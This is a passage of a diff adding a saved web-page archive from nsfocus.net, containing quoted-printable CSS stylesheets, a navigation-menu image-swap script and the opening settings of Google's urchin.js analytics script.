+#e3e8e8; BORDER-TOP-COLOR: #e3e8e8; BORDER-COLLAPSE: collapse; =
+BORDER-RIGHT-COLOR: #e3e8e8
+}
+.table_bold {
+	FONT-WEIGHT: bold; FONT-SIZE: 9pt; COLOR: #173c40; LINE-HEIGHT: 15pt
+}
+.table_bold_green {
+	FONT-WEIGHT: bold; FONT-SIZE: 9pt; COLOR: #6ab600; LINE-HEIGHT: 15pt
+}
+#doyoo_panel {
+	POSITION: absolute
+}
+.pic_show {
+	PADDING-RIGHT: 0px; PADDING-LEFT: 7px; FONT-SIZE: 12px; BACKGROUND: =
+#dae2e1; PADDING-BOTTOM: 0px; WIDTH: 580px; PADDING-TOP: 7px; =
+FONT-FAMILY: "=CB=CE=CC=E5"; HEIGHT: 446px
+}
+.pic_show A {
+	COLOR: #173c40; TEXT-DECORATION: none
+}
+.pic_show #pic_foc {
+	BORDER-TOP-WIDTH: 0px; BORDER-LEFT-WIDTH: 0px; BORDER-BOTTOM-WIDTH: =
+0px; WIDTH: 331px; HEIGHT: 404px; BORDER-RIGHT-WIDTH: 0px
+}
+.pic_show .title {
+	MARGIN: 5px 0px 0px; OVERFLOW: hidden; WIDTH: 331px; LINE-HEIGHT: 23px; =
+POSITION: relative; HEIGHT: 23px
+}
+.pic_show .title B {
+	FONT-WEIGHT: normal; COLOR: #173c40; POSITION: absolute
+}
+.pic_show .title SPAN {
+	PADDING-RIGHT: 2px; PADDING-LEFT: 13px; BACKGROUND: =
+url(../images/pic_show_arrow_down.gif) no-repeat 0px 7px; FLOAT: right; =
+PADDING-BOTTOM: 0px; PADDING-TOP: 0px
+}
+.pic_show .scrollholder {
+	FLOAT: right; MARGIN: 0px 4px 0px 0px; OVERFLOW: hidden; WIDTH: 240px; =
+HEIGHT: 438px; -margin: 0 2px 0 0
+}
+.pic_show .scroll {
+	FLOAT: right; WIDTH: 249px
+}
+.pic_show .scroll IMG {
+	BORDER-TOP-WIDTH: 0px; BORDER-LEFT-WIDTH: 0px; BORDER-BOTTOM-WIDTH: =
+0px; BORDER-RIGHT-WIDTH: 0px
+}
+.pic_show .scroll .pic_s {
+	BACKGROUND: url(../images/pic_show_arrow.gif) #a3b6b3 no-repeat 0px =
+-102px; MARGIN: 0px 0px 3px; WIDTH: 222px; LINE-HEIGHT: 20px; HEIGHT: =
+102px
+}
+.pic_show .scroll .current.pic_s {
+	BACKGROUND: url(../images/pic_show_arrow.gif) white no-repeat 0px 0px
+}
+.pic_show .scroll .last.pic_s {
+	MARGIN: 0px
+}
+.pic_show .scroll .pic_s A {
+	DISPLAY: block; WIDTH: 222px; COLOR: white; HEIGHT: 102px
+}
+.pic_show .scroll .pic_s A SPAN {
+	POSITION: relative; TOP: 12px
+}
+.pic_show .scroll .current.pic_s A {
+	COLOR: #173c40
+}
+.pic_show .scroll .pic_s IMG {
+	BORDER-RIGHT: #a3b6b3 1px solid; BORDER-TOP: #a3b6b3 1px solid; FLOAT: =
+left; MARGIN: 8px 3px 0px 10px; BORDER-LEFT: #a3b6b3 1px solid; WIDTH: =
+74px; BORDER-BOTTOM: #a3b6b3 1px solid; HEIGHT: 86px
+}
+.pic_show .scroll .pic_s .video IMG {
+	MARGIN-TOP: 15px; WIDTH: 74px; HEIGHT: 61px
+}
+.pic_show .hide {
+	DISPLAY: none
+}
+DIV.scrollholder {
+	Z-INDEX: 1; OVERFLOW: auto; POSITION: relative; HEIGHT: 330px
+}
+DIV.scroll {
+	Z-INDEX: 2; LEFT: 0px; WIDTH: 95%; POSITION: absolute; TOP: 0px
+}
+DIV.track {
+	FONT-SIZE: 0px; Z-INDEX: 3; BACKGROUND: white; FLOAT: right; WIDTH: =
+11px; POSITION: relative; TOP: 0px; HEIGHT: 100%
+}
+DIV.drag_bar {
+	Z-INDEX: 4; BACKGROUND: url(../images/pic_show_scroll.gif) #657a7d =
+no-repeat 2px 50%; WIDTH: 100%; CURSOR: pointer; POSITION: absolute; =
+HEIGHT: 14px
+}
+.pic_list {
+	PADDING-RIGHT: 0px; PADDING-LEFT: 0px; LEFT: -19px; PADDING-BOTTOM: =
+50px; WIDTH: 103.5%; PADDING-TOP: 0px; FONT-FAMILY: "=CB=CE=CC=E5"; =
+POSITION: relative; -width: 108.5%; -left: -39px
+}
+.pic_list UL {
+	PADDING-RIGHT: 0px; PADDING-LEFT: 0px; FLOAT: left; PADDING-BOTTOM: =
+0px; MARGIN: 0px 0px 0px 20px; WIDTH: 283px; PADDING-TOP: 0px
+}
+.pic_list UL LI {
+	PADDING-RIGHT: 0px; PADDING-LEFT: 0px; LIST-STYLE-POSITION: outside; =
+PADDING-BOTTOM: 0px; PADDING-TOP: 10px; BORDER-BOTTOM: #c3d7da 1px =
+solid; LIST-STYLE-TYPE: none; HEIGHT: 118px
+}
+.pic_list UL LI.title {
+	PADDING-RIGHT: 0px; PADDING-LEFT: 0px; FONT-WEIGHT: bold; BACKGROUND: =
+url(../images/arrow_left.gif) #a3b6b3 no-repeat 0px 0px; PADDING-BOTTOM: =
+0px; OVERFLOW: hidden; COLOR: white; BORDER-TOP-STYLE: none; =
+TEXT-INDENT: 10px; LINE-HEIGHT: 20px; PADDING-TOP: 0px; =
+BORDER-RIGHT-STYLE: none; BORDER-LEFT-STYLE: none; HEIGHT: 19px; =
+BORDER-BOTTOM-STYLE: none
+}
+.pic_list UL LI A {
+	BACKGROUND: url(../images/pic_show_arrow_down.gif) no-repeat 5px 104px; =
+FLOAT: left; MARGIN: -6px 0px 0px; LINE-HEIGHT: 25px; TEXT-ALIGN: center
+}
+.pic_list UL LI A:hover {
+	COLOR: #315458
+}
+.pic_list UL LI A IMG {
+	BORDER-RIGHT: #a3b6b3 1px solid; BORDER-TOP: #a3b6b3 1px solid; MARGIN: =
+8px 8px 0px 0px; BORDER-LEFT: #a3b6b3 1px solid; WIDTH: 74px; =
+BORDER-BOTTOM: #a3b6b3 1px solid; HEIGHT: 86px
+}
+.pic_list UL LI SPAN {
+	COLOR: #315458
+}
+.pic_list UL LI SPAN B {
+	DISPLAY: block; COLOR: #508b10
+}
+.pic_list:unknown {
+	CLEAR: both; DISPLAY: block; VISIBILITY: hidden; HEIGHT: 0px; content: =
+"."
+}
+
+------=_NextPart_000_0000_01CADFA9.810FE4D0
+Content-Type: text/css;
+	charset="gb2312"
+Content-Transfer-Encoding: quoted-printable
+Content-Location: http://www.nsfocus.net/css/main.css
+
+BODY {
+	PADDING-RIGHT: 0px; PADDING-LEFT: 0px; PADDING-BOTTOM: 0px; MARGIN: =
+0px; BORDER-TOP-STYLE: none; PADDING-TOP: 0px; BORDER-RIGHT-STYLE: none; =
+BORDER-LEFT-STYLE: none; BORDER-BOTTOM-STYLE: none
+}
+BODY {
+	FONT-SIZE: 12px; COLOR: #50696d; LINE-HEIGHT: 150%; FONT-FAMILY: Arial, =
+Helvetica, sans-serif, =CB=CE=CC=E5
+}
+TD {
+	FONT-SIZE: 12px; COLOR: #50696d; LINE-HEIGHT: 150%; FONT-FAMILY: Arial, =
+Helvetica, sans-serif, =CB=CE=CC=E5
+}
+TH {
+	FONT-SIZE: 12px; COLOR: #50696d; LINE-HEIGHT: 150%; FONT-FAMILY: Arial, =
+Helvetica, sans-serif, =CB=CE=CC=E5
+}
+A {
+	FONT-SIZE: 12px; COLOR: #173c40; TEXT-DECORATION: none
+}
+A:hover {
+	FONT-SIZE: 12px; COLOR: #6ab600; TEXT-DECORATION: none
+}
+A.link {
+	FONT-SIZE: 12px; COLOR: #508b10; TEXT-DECORATION: none
+}
+A.link:hover {
+	FONT-SIZE: 12px; COLOR: #6ab600; TEXT-DECORATION: none
+}
+#bodyMain #bodyLeft A {
+	FONT-SIZE: 12px; COLOR: #7a7a7a; TEXT-DECORATION: none
+}
+.selectStyle {
+	BORDER-RIGHT: #00ff00 1px solid; BORDER-TOP: #00ff00 1px solid; =
+BORDER-LEFT: #00ff00 1px solid; BORDER-BOTTOM: #00ff00 1px solid
+}
+#bodyMain #bodyLeft A:hover {
+	FONT-SIZE: 12px; COLOR: #7a7a7a; TEXT-DECORATION: underline
+}
+#bodyMain #bodyRight A {
+	FONT-SIZE: 12px; COLOR: #657a7d; TEXT-DECORATION: none
+}
+#bodyMain #bodyRight A:hover {
+	FONT-SIZE: 12px; COLOR: #70ac25; TEXT-DECORATION: underline
+}
+.navtd {
+	FONT-SIZE: 0px
+}
+.textStyle {
+	FONT-SIZE: 12px; COLOR: #7a7a7a; TEXT-DECORATION: none
+}
+.newsStyle {
+	FONT-SIZE: 12px; COLOR: #657a7d; TEXT-DECORATION: none
+}
+.newsDateStyle {
+	FONT-SIZE: 12px; COLOR: #8e8e8e; TEXT-DECORATION: none
+}
+.loginStyle {
+	FONT-SIZE: 12px; COLOR: #70ac25; TEXT-DECORATION: none
+}
+.bottomStyle {
+	FONT-SIZE: 10px; COLOR: #3e5f62; TEXT-DECORATION: none
+}
+.leftMenuText {
+	FONT-SIZE: 12px; COLOR: #315458
+}
+#bodyMain TABLE {
+	FONT-SIZE: 12px; COLOR: #657a7d; LINE-HEIGHT: 18px
+}
+.tableku {
+	BORDER-RIGHT: #c6cccb 1px solid; BORDER-TOP: #c6cccb 1px solid; =
+BORDER-LEFT: #c6cccb 1px solid; BORDER-BOTTOM: #c6cccb 1px solid
+}
+.border_under {
+	BORDER-RIGHT: #c6cccb 1px solid; BORDER-LEFT: #c6cccb 1px solid; =
+BORDER-BOTTOM: #c6cccb 1px solid
+}
+.tableku1 {
+	BORDER-RIGHT: #91aca7 1px solid; BORDER-TOP: #91aca7 1px solid; =
+BORDER-LEFT: #91aca7 1px solid; BORDER-BOTTOM: #91aca7 1px solid
+}
+#white_link A {
+	FONT-SIZE: 12px; COLOR: #ffffff; TEXT-DECORATION: underline
+}
+#white_link A:hover {
+	FONT-SIZE: 12px; COLOR: #ffffff; TEXT-DECORATION: none
+}
+#green_link A {
+	COLOR: #6ab600; TEXT-DECORATION: none
+}
+#green_link A:hover {
+	COLOR: #6ab600; TEXT-DECORATION: underline
+}
+.border {
+	BORDER-RIGHT: #d5dfdf 1px solid; BORDER-TOP: #d5dfdf 1px solid; =
+BORDER-LEFT: #d5dfdf 1px solid; BORDER-BOTTOM: #d5dfdf 1px solid
+}
+.border_2 {
+	BORDER-RIGHT: #8ea5a1 1px solid; BORDER-TOP: #8ea5a1 1px solid; =
+BORDER-LEFT: #8ea5a1 1px solid; BORDER-BOTTOM: #8ea5a1 1px solid
+}
+.border_white {
+	BORDER-RIGHT: #ffffff 1px solid; BORDER-TOP: #ffffff 1px solid; =
+BORDER-LEFT: #ffffff 1px solid; BORDER-BOTTOM: #ffffff 1px solid
+}
+.txt_table {
+	FONT-SIZE: 12px; COLOR: #173c40; BACKGROUND-COLOR: #ffffff
+}
+.txt_bold {
+	FONT-WEIGHT: bold; FONT-SIZE: 12px; COLOR: #173c40
+}
+.txt_bold_white {
+	FONT-WEIGHT: bold; FONT-SIZE: 12px; BACKGROUND: #a3b6b3; COLOR: #ffffff
+}
+.txt_normal_white {
+	FONT-SIZE: 12px; BACKGROUND: #eaebeb; COLOR: #173c40
+}
+.txt_bold_2 {
+	FONT-WEIGHT: bold; FONT-SIZE: 12px; COLOR: #598429
+}
+.txt_bold_white A {
+	COLOR: #ffffff; TEXT-DECORATION: none
+}
+.txt_bold_white A:hover {
+	COLOR: #ffffff; TEXT-DECORATION: underline
+}
+.txt_bold_14px {
+	FONT-WEIGHT: bold; FONT-SIZE: 14px; COLOR: #173c40
+}
+.txt_10px {
+	FONT-SIZE: 10px
+}
+.txt_red {
+	FONT-SIZE: 12px; COLOR: red
+}
+.txt_gray {
+	FONT-SIZE: 12px; COLOR: #cccccc
+}
+.rightBoxTitle {
+	PADDING-LEFT: 5px; FONT-SIZE: 12px; COLOR: #315458
+}
+.bodyBoxTitle {
+	PADDING-LEFT: 10px; FONT-SIZE: 12px; COLOR: #315458
+}
+.newTitleStyle {
+	FONT-SIZE: 11px; COLOR: #315458
+}
+.tableStyle {
+	FONT-SIZE: 12px; BORDER-LEFT-COLOR: #e3e8e8; BORDER-BOTTOM-COLOR: =
+#e3e8e8; BORDER-TOP-COLOR: #e3e8e8; BORDER-COLLAPSE: collapse; =
+BORDER-RIGHT-COLOR: #e3e8e8
+}
+.table_bold {
+	FONT-WEIGHT: bold; FONT-SIZE: 9pt; COLOR: #173c40; LINE-HEIGHT: 15pt
+}
+.table_bold_green {
+	FONT-WEIGHT: bold; FONT-SIZE: 9pt; COLOR: #6ab600; LINE-HEIGHT: 15pt
+}
+#doyoo_panel {
+	POSITION: absolute
+}
+.pic_show {
+	PADDING-RIGHT: 0px; PADDING-LEFT: 7px; FONT-SIZE: 12px; BACKGROUND: =
+#dae2e1; PADDING-BOTTOM: 0px; WIDTH: 580px; PADDING-TOP: 7px; =
+FONT-FAMILY: "=CB=CE=CC=E5"; HEIGHT: 446px
+}
+.pic_show A {
+	COLOR: #173c40; TEXT-DECORATION: none
+}
+.pic_show #pic_foc {
+	BORDER-TOP-WIDTH: 0px; BORDER-LEFT-WIDTH: 0px; BORDER-BOTTOM-WIDTH: =
+0px; WIDTH: 331px; HEIGHT: 404px; BORDER-RIGHT-WIDTH: 0px
+}
+.pic_show .title {
+	MARGIN: 5px 0px 0px; OVERFLOW: hidden; WIDTH: 331px; LINE-HEIGHT: 23px; =
+POSITION: relative; HEIGHT: 23px
+}
+.pic_show .title B {
+	FONT-WEIGHT: normal; COLOR: #173c40; POSITION: absolute
+}
+.pic_show .title SPAN {
+	PADDING-RIGHT: 2px; PADDING-LEFT: 13px; BACKGROUND: =
+url(../images/pic_show_arrow_down.gif) no-repeat 0px 7px; FLOAT: right; =
+PADDING-BOTTOM: 0px; PADDING-TOP: 0px
+}
+.pic_show .scrollholder {
+	FLOAT: right; MARGIN: 0px 4px 0px 0px; OVERFLOW: hidden; WIDTH: 240px; =
+HEIGHT: 438px; -margin: 0 2px 0 0
+}
+.pic_show .scroll {
+	FLOAT: right; WIDTH: 249px
+}
+.pic_show .scroll IMG {
+	BORDER-TOP-WIDTH: 0px; BORDER-LEFT-WIDTH: 0px; BORDER-BOTTOM-WIDTH: =
+0px; BORDER-RIGHT-WIDTH: 0px
+}
+.pic_show .scroll .pic_s {
+	BACKGROUND: url(../images/pic_show_arrow.gif) #a3b6b3 no-repeat 0px =
+-102px; MARGIN: 0px 0px 3px; WIDTH: 222px; LINE-HEIGHT: 20px; HEIGHT: =
+102px
+}
+.pic_show .scroll .current.pic_s {
+	BACKGROUND: url(../images/pic_show_arrow.gif) white no-repeat 0px 0px
+}
+.pic_show .scroll .last.pic_s {
+	MARGIN: 0px
+}
+.pic_show .scroll .pic_s A {
+	DISPLAY: block; WIDTH: 222px; COLOR: white; HEIGHT: 102px
+}
+.pic_show .scroll .pic_s A SPAN {
+	POSITION: relative; TOP: 12px
+}
+.pic_show .scroll .current.pic_s A {
+	COLOR: #173c40
+}
+.pic_show .scroll .pic_s IMG {
+	BORDER-RIGHT: #a3b6b3 1px solid; BORDER-TOP: #a3b6b3 1px solid; FLOAT: =
+left; MARGIN: 8px 3px 0px 10px; BORDER-LEFT: #a3b6b3 1px solid; WIDTH: =
+74px; BORDER-BOTTOM: #a3b6b3 1px solid; HEIGHT: 86px
+}
+.pic_show .scroll .pic_s .video IMG {
+	MARGIN-TOP: 15px; WIDTH: 74px; HEIGHT: 61px
+}
+.pic_show .hide {
+	DISPLAY: none
+}
+DIV.scrollholder {
+	Z-INDEX: 1; OVERFLOW: auto; POSITION: relative; HEIGHT: 330px
+}
+DIV.scroll {
+	Z-INDEX: 2; LEFT: 0px; WIDTH: 95%; POSITION: absolute; TOP: 0px
+}
+DIV.track {
+	FONT-SIZE: 0px; Z-INDEX: 3; BACKGROUND: white; FLOAT: right; WIDTH: =
+11px; POSITION: relative; TOP: 0px; HEIGHT: 100%
+}
+DIV.drag_bar {
+	Z-INDEX: 4; BACKGROUND: url(../images/pic_show_scroll.gif) #657a7d =
+no-repeat 2px 50%; WIDTH: 100%; CURSOR: pointer; POSITION: absolute; =
+HEIGHT: 14px
+}
+.pic_list {
+	PADDING-RIGHT: 0px; PADDING-LEFT: 0px; LEFT: -19px; PADDING-BOTTOM: =
+50px; WIDTH: 103.5%; PADDING-TOP: 0px; FONT-FAMILY: "=CB=CE=CC=E5"; =
+POSITION: relative; -width: 108.5%; -left: -39px
+}
+.pic_list UL {
+	PADDING-RIGHT: 0px; PADDING-LEFT: 0px; FLOAT: left; PADDING-BOTTOM: =
+0px; MARGIN: 0px 0px 0px 20px; WIDTH: 283px; PADDING-TOP: 0px
+}
+.pic_list UL LI {
+	PADDING-RIGHT: 0px; PADDING-LEFT: 0px; LIST-STYLE-POSITION: outside; =
+PADDING-BOTTOM: 0px; PADDING-TOP: 10px; BORDER-BOTTOM: #c3d7da 1px =
+solid; LIST-STYLE-TYPE: none; HEIGHT: 118px
+}
+.pic_list UL LI.title {
+	PADDING-RIGHT: 0px; PADDING-LEFT: 0px; FONT-WEIGHT: bold; BACKGROUND: =
+url(../images/arrow_left.gif) #a3b6b3 no-repeat 0px 0px; PADDING-BOTTOM: =
+0px; OVERFLOW: hidden; COLOR: white; BORDER-TOP-STYLE: none; =
+TEXT-INDENT: 10px; LINE-HEIGHT: 20px; PADDING-TOP: 0px; =
+BORDER-RIGHT-STYLE: none; BORDER-LEFT-STYLE: none; HEIGHT: 19px; =
+BORDER-BOTTOM-STYLE: none
+}
+.pic_list UL LI A {
+	BACKGROUND: url(../images/pic_show_arrow_down.gif) no-repeat 5px 104px; =
+FLOAT: left; MARGIN: -6px 0px 0px; LINE-HEIGHT: 25px; TEXT-ALIGN: center
+}
+.pic_list UL LI A:hover {
+	COLOR: #315458
+}
+.pic_list UL LI A IMG {
+	BORDER-RIGHT: #a3b6b3 1px solid; BORDER-TOP: #a3b6b3 1px solid; MARGIN: =
+8px 8px 0px 0px; BORDER-LEFT: #a3b6b3 1px solid; WIDTH: 74px; =
+BORDER-BOTTOM: #a3b6b3 1px solid; HEIGHT: 86px
+}
+.pic_list UL LI SPAN {
+	COLOR: #315458
+}
+.pic_list UL LI SPAN B {
+	DISPLAY: block; COLOR: #508b10
+}
+.pic_list:unknown {
+	CLEAR: both; DISPLAY: block; VISIBILITY: hidden; HEIGHT: 0px; content: =
+"."
+}
+
+------=_NextPart_000_0000_01CADFA9.810FE4D0
+Content-Type: text/css;
+	charset="gb2312"
+Content-Transfer-Encoding: quoted-printable
+Content-Location: http://www.nsfocus.net/css/botton.css
+
+INPUT.normal {
+	BORDER-RIGHT: #a0b700 1px solid; BORDER-TOP: #a0b700 1px solid; =
+BACKGROUND: url(../images/search_input.gif); FONT: 12px/15px Arial, =
+Helvetica, sans-serif; BORDER-LEFT: #a0b700 1px solid; WIDTH: 135px; =
+COLOR: #657a7d; BORDER-BOTTOM: #a0b700 1px solid; HEIGHT: 15px
+}
+INPUT.normal1 {
+	BORDER-RIGHT: #a0b700 1px solid; BORDER-TOP: #a0b700 1px solid; =
+BACKGROUND: url(../images/search_input.gif); FONT: 12px/15px Arial, =
+Helvetica, sans-serif; BORDER-LEFT: #a0b700 1px solid; WIDTH: 100px; =
+COLOR: #657a7d; BORDER-BOTTOM: #a0b700 1px solid; HEIGHT: 15px
+}
+INPUT.buttonface {
+	BORDER-LEFT-COLOR: #ffffff; BACKGROUND: url(../images/buttonface_1.gif) =
+#ffffff; BORDER-BOTTOM-COLOR: #ffffff; FONT: 12px/19px Arial, Helvetica, =
+sans-serif; WIDTH: 67px; COLOR: #235158; BORDER-TOP-STYLE: none; =
+BORDER-TOP-COLOR: #ffffff; BORDER-RIGHT-STYLE: none; BORDER-LEFT-STYLE: =
+none; HEIGHT: 19px; BORDER-RIGHT-COLOR: #ffffff; BORDER-BOTTOM-STYLE: =
+none
+}
+INPUT.button_search {
+	BORDER-LEFT-COLOR: #ffffff; BACKGROUND: =
+url(../images/top_nav/search_go.gif) #ffffff; BORDER-BOTTOM-COLOR: =
+#ffffff; FONT: 12px/23px Arial, Helvetica, sans-serif; WIDTH: 28px; =
+COLOR: #235158; BORDER-TOP-STYLE: none; BORDER-TOP-COLOR: #ffffff; =
+BORDER-RIGHT-STYLE: none; BORDER-LEFT-STYLE: none; HEIGHT: 23px; =
+BORDER-RIGHT-COLOR: #ffffff; BORDER-BOTTOM-STYLE: none
+}
+INPUT.smallInput {
+	BORDER-RIGHT: #03185b 1px solid; BORDER-TOP: #03185b 1px solid; FONT: =
+9pt Verdana, Arial, Helvetica, sans-serif; BORDER-LEFT: #03185b 1px =
+solid; WIDTH: 110px; COLOR: #373c64; BORDER-BOTTOM: #03185b 1px solid; =
+HEIGHT: 18px; BACKGROUND-COLOR: #ffffff
+}
+.select {
+	BORDER-RIGHT: #a0b700 1px solid; BORDER-TOP: #a0b700 1px solid; =
+FONT-SIZE: 12px; BORDER-LEFT: #a0b700 1px solid; LINE-HEIGHT: 9px; =
+BORDER-BOTTOM: #a0b700 1px solid; FONT-FAMILY: Arial, Geneva, Helvetica; =
+HEIGHT: 20px; font-color: 657a7d#
+}
+.select1 {
+	BORDER-RIGHT: #a0b700 1px solid; BORDER-TOP: #a0b700 1px solid; =
+FONT-SIZE: 12px; BORDER-LEFT: #a0b700 1px solid; WIDTH: 170px; =
+LINE-HEIGHT: 9px; BORDER-BOTTOM: #a0b700 1px solid; FONT-FAMILY: Arial, =
+Geneva, Helvetica; HEIGHT: 20px; font-color: 657a7d#
+}
+.select2 {
+	BORDER-RIGHT: #a0b700 1px solid; BORDER-TOP: #a0b700 1px solid; =
+FONT-SIZE: 12px; BORDER-LEFT: #a0b700 1px solid; WIDTH: 135px; =
+LINE-HEIGHT: 9px; BORDER-BOTTOM: #a0b700 1px solid; FONT-FAMILY: Arial, =
+Geneva, Helvetica; HEIGHT: 20px; font-color: 657a7d#
+}
+
+------=_NextPart_000_0000_01CADFA9.810FE4D0
+Content-Type: application/octet-stream
+Content-Transfer-Encoding: quoted-printable
+Content-Location: http://www.nsfocus.net/js/topMenu.js
+
+=EF=BB=BF//=E5=AE=9A=E4=B9=89=E6=95=B0=E6=8D=AE
+var menuA =3D new Array("menu0", "menu1", "menu2", "menu3", "menu4", =
+"menu5", "menu6");
+var menuPhotoB =3D new Array("/images/top_nav/topNav_left_bg.gif", =
+"/images/top_nav/topNav_1_on.gif", "/images/top_nav/topNav_2_on.gif", =
+"/images/top_nav/topNav_3_on.gif", "/images/top_nav/topNav_4_on.gif", =
+"/images/top_nav/topNav_5_on.gif", "/images/top_nav/topNav_6_on.gif");
+var menuPhotoA =3D new Array("/images/top_nav/topNav_backHome.gif", =
+"/images/top_nav/topNav_1_off.gif", "/images/top_nav/topNav_2_off.gif", =
+"/images/top_nav/topNav_3_off.gif", "/images/top_nav/topNav_4_off.gif", =
+"/images/top_nav/topNav_5_off.gif", "/images/top_nav/topNav_6_off.gif");
+var initID =3D menuA[startID];
+var initImg =3D menuPhotoB[startID];
+//=E5=88=9D=E5=A7=8B=E5=8C=96
+function InitMenu () {
+	for (var i=3D1; i<=3D6; i++) {
+		document.images[menuA[i]].src=3DmenuPhotoA[i];
+	}
+=09
+	if(initID !=3D 'menu0'){ =20
+		document.images['menu0'].src=3D'/images/top_nav/topNav_backHome.gif';
+	}else{
+		document.images['menu0'].src=3D'/images/top_nav/topNav_left_bg.gif';
+	}   =20
+	document.images[menuA[startID]].src=3DmenuPhotoB[startID];
+}
+//=E9=BC=A0=E6=A0=87=E7=82=B9=E5=87=BB
+function navchange(img,MenuId)
+{
+	for (var i=3D0; i<=3D6; i++) {
+		document.images[menuA[i]].src=3DmenuPhotoA[i];
+	}
+	document.images[MenuId].src=3Dimg;
+	initImg=3Dimg;
+	initID=3DMenuId;
+}=09
+//=E9=BC=A0=E6=A0=87=E7=A7=BB=E5=87=BA
+function checkChange (img, menuID) {
+	if (menuID =3D=3D initID) {
+		document.images[menuID].src=3DinitImg;
+	}else {
+		document.images[menuID].src=3Dimg;
+	}
+}
+//=E5=9B=9E=E5=88=B0=E9=A6=96=E9=A1=B5
+function returnMain(){
+	document.images['menu0'].src=3D'/images/top_nav/topNav_left_bg.gif';
+	for (var i=3D1; i<=3D6; i++) {
+		document.images[menuA[i]].src=3DmenuPhotoA[i];
+	}
+	initImg=3D'/images/top_nav/topNav_left_bg.gif';
+	initID=3D'menu0';
+}
+------=_NextPart_000_0000_01CADFA9.810FE4D0
+Content-Type: application/octet-stream
+Content-Transfer-Encoding: quoted-printable
+Content-Location: http://www.google-analytics.com/urchin.js
+
+//-- Google Analytics Urchin Module=0A=
+//-- Copyright 2007 Google, All Rights Reserved.=0A=
+=0A=
+//-- Urchin On Demand Settings ONLY=0A=
+var _uacct=3D"";			// set up the Urchin Account=0A=
+var _userv=3D1;			// service mode (0=3Dlocal,1=3Dremote,2=3Dboth)=0A=
+=0A=
+//-- UTM User Settings=0A=
+var _ufsc=3D1;			// set client info flag (1=3Don|0=3Doff)=0A=
+var _udn=3D"auto";		// (auto|none|domain) set the domain name for cookies=0A=
+var _uhash=3D"on";		// (on|off) unique domain hash for cookies=0A=
+var _utimeout=3D"1800";   	// set the inactive session timeout in seconds=0A=
+var _ugifpath=3D"/__utm.gif";	// set the web path to the __utm.gif file=0A=
+var _utsp=3D"|";			// transaction field separator=0A=
+var _uflash=3D1;			// set flash version detect option (1=3Don|0=3Doff)=0A=
+var _utitle=3D1;			// set the document title detect option =
+(1=3Don|0=3Doff)=0A=
+var _ulink=3D0;			// enable linker functionality (1=3Don|0=3Doff)=0A=
+var _uanchor=3D0;			// enable use of anchors for campaign =
+(1=3Don|0=3Doff)=0A=
+var _utcp=3D"/";			// the cookie path for tracking=0A=
+var _usample=3D100;		// The sampling % of visitors to track (1-100).=0A=
+=0A=
+//-- UTM Campaign Tracking Settings=0A=
+var _uctm=3D1;			// set campaign tracking module (1=3Don|0=3Doff)=0A=
+var _ucto=3D"15768000";		// set timeout in seconds (6 month default)=0A=
+var _uccn=3D"utm_campaign";	// name=0A=
+var _ucmd=3D"utm_medium";		// medium (cpc|cpm|link|email|organic)=0A=
+var _ucsr=3D"utm_source";		// source=0A=
+var _uctr=3D"utm_term";		// term/keyword=0A=
+var _ucct=3D"utm_content";	// content=0A=
+var _ucid=3D"utm_id";		// id number=0A=
+var _ucno=3D"utm_nooverride";	// don't override=0A=
+=0A=
+//-- Auto/Organic Sources and Keywords=0A=
+var _uOsr=3Dnew Array();=0A=
+var _uOkw=3Dnew Array();=0A=
+_uOsr[0]=3D"google";	_uOkw[0]=3D"q";=0A=
+_uOsr[1]=3D"yahoo";	_uOkw[1]=3D"p";=0A=
+_uOsr[2]=3D"msn";		_uOkw[2]=3D"q";=0A=
+_uOsr[3]=3D"aol";		_uOkw[3]=3D"query";=0A=
+_uOsr[4]=3D"aol";		_uOkw[4]=3D"encquery";=0A=
+_uOsr[5]=3D"lycos";	_uOkw[5]=3D"query";=0A=
+_uOsr[6]=3D"ask";		_uOkw[6]=3D"q";=0A=
+_uOsr[7]=3D"altavista";	_uOkw[7]=3D"q";=0A=
+_uOsr[8]=3D"netscape";	_uOkw[8]=3D"query";=0A=
+_uOsr[9]=3D"cnn";	_uOkw[9]=3D"query";=0A=
+_uOsr[10]=3D"looksmart";	_uOkw[10]=3D"qt";=0A=
+_uOsr[11]=3D"about";	_uOkw[11]=3D"terms";=0A=
+_uOsr[12]=3D"mamma";	_uOkw[12]=3D"query";=0A=
+_uOsr[13]=3D"alltheweb";	_uOkw[13]=3D"q";=0A=
+_uOsr[14]=3D"gigablast";	_uOkw[14]=3D"q";=0A=
+_uOsr[15]=3D"voila";	_uOkw[15]=3D"rdata";=0A=
+_uOsr[16]=3D"virgilio";	_uOkw[16]=3D"qs";=0A=
+_uOsr[17]=3D"live";	_uOkw[17]=3D"q";=0A=
+_uOsr[18]=3D"baidu";	_uOkw[18]=3D"wd";=0A=
+_uOsr[19]=3D"alice";	_uOkw[19]=3D"qs";=0A=
+_uOsr[20]=3D"yandex";	_uOkw[20]=3D"text";=0A=
+_uOsr[21]=3D"najdi";	_uOkw[21]=3D"q";=0A=
+_uOsr[22]=3D"aol";	_uOkw[22]=3D"q";=0A=
+_uOsr[23]=3D"club-internet"; _uOkw[23]=3D"query";=0A=
+_uOsr[24]=3D"mama";	_uOkw[24]=3D"query";=0A=
+_uOsr[25]=3D"seznam";	_uOkw[25]=3D"q";=0A=
+_uOsr[26]=3D"search";	_uOkw[26]=3D"q";=0A=
+_uOsr[27]=3D"wp";	_uOkw[27]=3D"szukaj";=0A=
+_uOsr[28]=3D"onet";	_uOkw[28]=3D"qt";=0A=
+_uOsr[29]=3D"netsprint";	_uOkw[29]=3D"q";=0A=
+_uOsr[30]=3D"google.interia";	_uOkw[30]=3D"q";=0A=
+_uOsr[31]=3D"szukacz";	_uOkw[31]=3D"q";=0A=
+_uOsr[32]=3D"yam";	_uOkw[32]=3D"k";=0A=
+_uOsr[33]=3D"pchome";	_uOkw[33]=3D"q";=0A=
+_uOsr[34]=3D"kvasir";	_uOkw[34]=3D"searchExpr";=0A=
+_uOsr[35]=3D"sesam";	_uOkw[35]=3D"q";=0A=
+_uOsr[36]=3D"ozu"; _uOkw[36]=3D"q";=0A=
+_uOsr[37]=3D"terra"; _uOkw[37]=3D"query";=0A=
+_uOsr[38]=3D"nostrum"; _uOkw[38]=3D"query";=0A=
+_uOsr[39]=3D"mynet"; _uOkw[39]=3D"q";=0A=
+_uOsr[40]=3D"ekolay"; _uOkw[40]=3D"q";=0A=
+_uOsr[41]=3D"search.ilse"; _uOkw[41]=3D"search_for";=0A=
+_uOsr[42]=3D"bing"; _uOkw[42]=3D"q";=0A=
+=0A=
+//-- Auto/Organic Keywords to Ignore=0A=
+var _uOno=3Dnew Array();=0A=
